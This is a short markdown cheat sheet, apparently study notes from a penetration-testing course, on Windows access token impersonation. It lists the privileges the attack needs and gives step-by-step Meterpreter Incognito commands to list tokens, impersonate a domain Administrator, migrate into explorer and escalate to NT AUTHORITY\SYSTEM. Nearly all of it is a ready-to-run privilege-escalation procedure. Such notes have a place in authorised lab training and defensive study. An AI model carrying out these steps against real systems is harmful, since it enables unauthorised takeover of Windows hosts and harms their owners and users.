# Access Token Impersonation

* [Metasploit Incognito Module](#metasploit-incognito-module)
* [References](#references)

***********************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
***********************************************************************

* The following are the privileges that are required for a successful impersonation attack:

   * SeAssignPrimaryToken
      * This allows a user to impersonate tokens

    * SeCreateToken
       * This allows a user to create an arbitrary token with administrative privileges

    * SeImpersonatePrivilege
       * This allows a user to create a process under the security context of another user typically with administrative privileges

***********************************************************************

## Metasploit Incognito Module

Once initial meterpreter session is obtained, list user privileges:
```
getprivs
```
If SeImpersonatePrivilege is set:

```
load incognito
```
```
list_tokens -u
```
Copy name of Delegation Token then run:
```
impersonate_token "[TOKEN]"
```
Example:
```
impersonate_token "ATTACKDEFENSE\Administrator"
```
Confirm privileges:
```
getuid
```
Migrate to x64 process:
```
pgrep explorer
```
```
migrate [EXPLORER-PID]
```
Check privileges again:
```
getprivs
```
```
getuid
```
List Tokens again to escalate privileges further:
```
list_tokens -u
```
and impersonate the next token:
```
impersonate_token "NT AUTHORITY\SYSTEM"
```

***********************************************************************

### References
Penetration Tester Student v2 by INE  
https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student-v2